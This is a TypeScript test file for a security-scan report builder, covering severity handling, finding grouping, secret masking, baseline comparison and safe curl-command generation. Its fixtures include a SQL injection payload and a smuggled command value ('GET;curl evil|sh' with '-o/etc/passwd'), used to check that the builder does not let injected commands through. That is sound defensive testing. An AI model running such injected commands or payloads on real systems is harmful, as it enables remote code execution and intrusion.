import { beforeEach, test } from 'node:test';
import assert from 'node:assert/strict';
import {
  buildCurl,
  buildProjectReport,
  buildScanReport,
  filterIssues,
  meetsMinSeverity,
  normalizeSeverity,
  type ReportOptions,
} from './model.js';

const NOW = new Date('2026-09-29T12:00:00Z');

function opts(overrides: Partial<ReportOptions> = {}): ReportOptions {
  return { minSeverity: 'low', includeEvidence: false, maxOccurrencesPerType: 10, generatedAt: NOW, ...overrides };
}

let seq = 0;
beforeEach(() => {
  seq = 0;
});
function issue(overrides: Record<string, any> = {}): any {
  seq += 1;
  return {
    id: `issue-${seq}`,
    kind_id: 114,
    kind: {
      id: 114,
      name: 'SQL Injection',
      taxonomy: [
        { code: 'A03', name: 'Injection', standard_name: 'OWASP Top 10', version: '2021', reference_url: 'https://owasp.org/Top10/A03_2021-Injection/' },
        { code: 'A01', name: 'Injection', standard_name: 'OWASP Top 10', version: '2017' },
        { code: 'CWE-89', name: 'SQL Injection', standard_name: 'CWE', version: '4.18' },
      ],
    },
    severity: 'CRITICAL',
    resolution: 0,
    http_method: 'POST',
    url_path: '/search',
    parameter_name: 'q',
    payload: "' OR '1'='1",
    evidence: 'syntax error near OR',
    ai_explanation: 'The q parameter is concatenated into SQL.',
    extra_info: { tool_name: 'zap', http_requests: [{ method: 'POST', url: 'http://app.test/search', headers: [{ name: 'content-type', value: 'application/json' }], postData: { text: '{"q":"x"}' } }] },
    ...overrides,
  };
}

const SCAN = {
  id: 'scan-2',
  target_id: 't-1',
  target_name: 'shop-api',
  target_type: 'OpenAPI',
  location: 'http://app.test',
  project_name: 'Payments',
  status_value: 'SUCCEEDED',
  status: 1,
  started_at: '2026-09-29T10:00:00Z',
  ended_at: '2026-09-29T10:15:00Z',
  completed_in: 900.4,
  engine_checks_configuration: { use_zap: true, use_nuclei: true },
  configuration: { excluded_url_patterns: ['.*logout.*', '.*login.*'] },
  created_by: { email: 'person@example.com' },
};

test('normalizeSeverity maps API spellings onto report levels', () => {
  assert.equal(normalizeSeverity('INFORMATIONAL'), 'INFO');
  assert.equal(normalizeSeverity('info'), 'INFO');
  assert.equal(normalizeSeverity('High'), 'HIGH');
  assert.equal(normalizeSeverity('Unknown'), 'UNSPECIFIED');
  assert.equal(normalizeSeverity(undefined), 'UNSPECIFIED');
});

test('meetsMinSeverity treats unspecified as info', () => {
  assert.equal(meetsMinSeverity('LOW', 'low'), true);
  assert.equal(meetsMinSeverity('INFO', 'low'), false);
  assert.equal(meetsMinSeverity('UNSPECIFIED', 'info'), true);
  assert.equal(meetsMinSeverity('MEDIUM', 'high'), false);
});

test('filterIssues keeps open findings and counts every exclusion', () => {
  const { kept, exclusions } = filterIssues([
    issue(),
    issue({ resolution: 2 }),
    issue({ severity: 'INFO' }),
    issue({ severity: 'INFO', extra_info: { tool_name: 'online-checker' } }),
  ], 'low');
  assert.equal(kept.length, 1);
  assert.deepEqual(exclusions, { not_open: 1, below_threshold: 1, scan_meta: 1 });
});

test('buildScanReport groups by issue type, counts severities, and sorts most severe first', () => {
  const report = buildScanReport({
    scan: SCAN,
    issues: [
      issue(),
      issue({ url_path: '/users' }),
      issue({ kind_id: 35, kind: { id: 35, name: 'XSS (Reflected)' }, severity: 'HIGH' }),
      issue({ kind_id: 900, kind: { id: 900, name: 'Missing HSTS' }, severity: 'LOW', parameter_name: null }),
    ],
    pathsTested: 12,
    specFile: 'openapi.yml',
    sourceLinks: new Map([['issue-1', { file: 'routes/search.js', line: 42 }]]),
    options: opts(),
  });
  assert.equal(report.total_open, 4);
  assert.equal(report.distinct_types, 3);
  assert.deepEqual(report.counts, { CRITICAL: 2, HIGH: 1, MEDIUM: 0, LOW: 1, INFO: 0, UNSPECIFIED: 0 });
  assert.deepEqual(report.findings.map((f) => f.name), ['SQL Injection', 'XSS (Reflected)', 'Missing HSTS']);
  const sqli = report.findings[0];
  assert.equal(sqli.affected_paths, 2);
  assert.equal(sqli.source_linked, 1);
  // Source-linked rows sort first.
  assert.deepEqual(sqli.occurrences[0].source, { file: 'routes/search.js', line: 42 });
  assert.equal(report.scan.source_linked_count, 1);
  assert.equal(report.scan.duration_seconds, 900);
  assert.deepEqual(report.scan.engines, ['ZAP', 'Nuclei']);
  assert.equal(report.scan.excluded_url_patterns, 2);
  assert.equal(report.title, 'Security Report: shop-api');
});

test('taxonomy keeps only the newest version of each standard', () => {
  const report = buildScanReport({ scan: SCAN, issues: [issue()], pathsTested: null, specFile: null, sourceLinks: new Map(), options: opts() });
  assert.deepEqual(report.findings[0].taxonomy.map((t) => `${t.standard} ${t.code}`), ['OWASP Top 10 2021 A03', 'CWE 4.18 CWE-89']);
});

test('evidence is hidden and secrets masked unless include_evidence is set', () => {
  const secretIssue = issue({
    evidence: 'token=abcd1234secret',
    payload: 'Bearer 9f8e7d6c5b4a39281706',
    ai_explanation: 'The response leaked AKIAABCDEFGHIJKLMNOP in the body.',
  });
  const hidden = buildScanReport({ scan: SCAN, issues: [secretIssue], pathsTested: null, specFile: null, sourceLinks: new Map(), options: opts() });
  const occ = hidden.findings[0].occurrences[0];
  assert.equal(occ.evidence, null);
  assert.equal(occ.evidence_hidden, true);
  assert.match(occ.payload!, /Bearer \[REDACTED\]/);
  assert.doesNotMatch(hidden.findings[0].explanation!, /AKIA/);

  const shown = buildScanReport({ scan: SCAN, issues: [secretIssue], pathsTested: null, specFile: null, sourceLinks: new Map(), options: opts({ includeEvidence: true }) });
  assert.equal(shown.findings[0].occurrences[0].evidence, 'token=abcd1234secret');
  assert.match(shown.findings[0].explanation!, /AKIAABCDEFGHIJKLMNOP/);
});

test('remediation notes attach by issue type name (case-insensitive) or kind id', () => {
  const report = buildScanReport({
    scan: SCAN,
    issues: [issue(), issue({ kind_id: 35, kind: { id: 35, name: 'XSS (Reflected)' }, severity: 'HIGH' })],
    pathsTested: null,
    specFile: null,
    sourceLinks: new Map(),
    options: opts({ remediationNotes: [{ issue_type: 'sql injection', note: 'Parameterize it.' }, { issue_type: '35', note: 'Encode output.' }] }),
  });
  assert.equal(report.findings[0].remediation_note, 'Parameterize it.');
  assert.equal(report.findings[1].remediation_note, 'Encode output.');
});

test('occurrences are capped per type but totals stay truthful', () => {
  const many = Array.from({ length: 7 }, (_, i) => issue({ url_path: `/p${i}` }));
  const report = buildScanReport({ scan: SCAN, issues: many, pathsTested: null, specFile: null, sourceLinks: new Map(), options: opts({ maxOccurrencesPerType: 3 }) });
  assert.equal(report.findings[0].occurrences.length, 3);
  assert.equal(report.findings[0].occurrence_total, 7);
});

test('compare mode reports new, fixed, and still-open by type + endpoint + parameter', () => {
  const current = [issue(), issue({ url_path: '/new' })];
  const baseline = [issue(), issue({ url_path: '/gone', severity: 'HIGH' }), issue({ url_path: '/was-fixed', resolution: 2 })];
  const report = buildScanReport({
    scan: SCAN,
    issues: current,
    pathsTested: null,
    specFile: null,
    sourceLinks: new Map(),
    baseline: { scan: { id: 'scan-1', started_at: '2026-09-28T10:00:00Z' }, issues: baseline },
    options: opts(),
  });
  const c = report.comparison!;
  assert.equal(c.baseline_scan_id, 'scan-1');
  assert.equal(c.new_count, 1);
  assert.equal(c.fixed_count, 1);
  assert.equal(c.still_open_count, 1);
  assert.equal(c.new_findings[0].path, '/new');
  assert.equal(c.fixed_findings[0].path, '/gone');
  assert.equal(c.new_by_severity.CRITICAL, 1);
});

test('buildCurl uses the recorded request without auth headers', () => {
  const cmd = buildCurl(issue({ extra_info: { http_requests: [{
    method: 'POST',
    url: "http://app.test/it's",
    headers: [{ name: 'Authorization', value: '[REDACTED]' }, { name: 'Content-Type', value: 'application/x-www-form-urlencoded' }],
    postData: { text: '', params: [{ name: 'q', value: 'a b' }] },
  }] } }), null);
  assert.equal(cmd, `curl -i -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'q=a%20b' -- 'http://app.test/it'\\''s'`);
  assert.doesNotMatch(cmd, /Authorization/);
});

test('buildCurl falls back to target URL + path when no request was recorded', () => {
  assert.equal(buildCurl({ http_method: 'get', url_path: '/health' }, 'http://app.test/'), `curl -i -X GET -- 'http://app.test/health'`);
});

test('buildProjectReport rolls up open findings per target and ranks widespread types', () => {
  const scans = [
    { id: 's-a', target_id: 't-a', target_name: 'api', started_at: '2026-09-29T00:00:00Z', status_value: 'SUCCEEDED' },
    { id: 's-b', target_id: 't-b', target_name: 'web', started_at: '2026-09-28T00:00:00Z', status_value: 'SUCCEEDED' },
  ];
  const kindStats = new Map<string, any[]>([
    ['s-a', [
      { kind_id: 114, kind_name: 'SQL Injection', severity: 'CRITICAL', open: 2, vulnerable_paths_count: 2 },
      { kind_id: 900, kind_name: 'Missing HSTS', severity: 'LOW', open: 1, vulnerable_paths_count: 1 },
      { kind_id: 1, kind_name: 'Scan Started - Target is Online', severity: 'INFO', open: 1, vulnerable_paths_count: 1 },
    ]],
    ['s-b', [
      { kind_id: 900, kind_name: 'Missing HSTS', severity: 'LOW', open: 1, vulnerable_paths_count: 1 },
      { kind_id: 35, kind_name: 'XSS', severity: 'HIGH', open: 0, vulnerable_paths_count: 1 },
    ]],
  ]);
  const report = buildProjectReport({ projectName: 'Payments', scans, kindStats, options: opts({ minSeverity: 'info' }) });
  assert.equal(report.total_open, 4);
  assert.deepEqual(report.targets.map((t) => [t.target_name, t.total_open]), [['api', 3], ['web', 1]]);
  assert.deepEqual(report.top_types.map((t) => [t.name, t.targets]), [['SQL Injection', 1], ['Missing HSTS', 2]]);
});

test('buildCurl never lets a target-influenced method or URL break out of the command', () => {
  const cmd = buildCurl({ http_method: 'GET;curl evil|sh', url_path: '/x', extra_info: { http_requests: [{ method: 'GET;curl evil|sh', url: '-o/etc/passwd' }] } }, null);
  assert.equal(cmd, `curl -i -X GET -- '-o/etc/passwd'`);
});

test('buildCurl masks secrets in the body before truncating it', () => {
  const jwt = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U';
  const body = `${'a'.repeat(1480)} ${jwt}`;
  const masked = buildCurl({ extra_info: { http_requests: [{ method: 'POST', url: 'http://x.test', postData: { text: body } }] } }, null, false);
  // Masking first means the token is replaced whole and the marker survives the cut.
  assert.doesNotMatch(masked, /eyJhbGci/);
  assert.match(masked, /\[REDACTED\]/);
  // Truncating first would have left a partial token that no pattern matches.
  const raw = buildCurl({ extra_info: { http_requests: [{ method: 'POST', url: 'http://x.test', postData: { text: body } }] } }, null, true);
  assert.doesNotMatch(raw, /\[REDACTED\]/);
});

test('paths and parameters are masked when they carry secrets', () => {
  const report = buildScanReport({
    scan: SCAN,
    issues: [issue({ url_path: '/cb?access_token=abcdef123456', parameter_name: 'q' })],
    pathsTested: null,
    specFile: null,
    sourceLinks: new Map(),
    options: opts(),
  });
  assert.equal(report.findings[0].occurrences[0].path, '/cb?access_token=[REDACTED]');
});

test('compare mode counts a finding marked false positive as dismissed, not fixed', () => {
  const current = [issue({ url_path: '/still' }), issue({ url_path: '/dismissed', resolution: 1 })];
  const baseline = [issue({ url_path: '/still' }), issue({ url_path: '/dismissed' }), issue({ url_path: '/gone' })];
  const report = buildScanReport({
    scan: SCAN,
    issues: current,
    pathsTested: null,
    specFile: null,
    sourceLinks: new Map(),
    baseline: { scan: { id: 'scan-1' }, issues: baseline },
    options: opts(),
  });
  const c = report.comparison!;
  assert.equal(c.fixed_count, 1);
  assert.equal(c.fixed_findings[0].path, '/gone');
  assert.equal(c.dismissed_count, 1);
  assert.equal(c.still_open_count, 1);
});
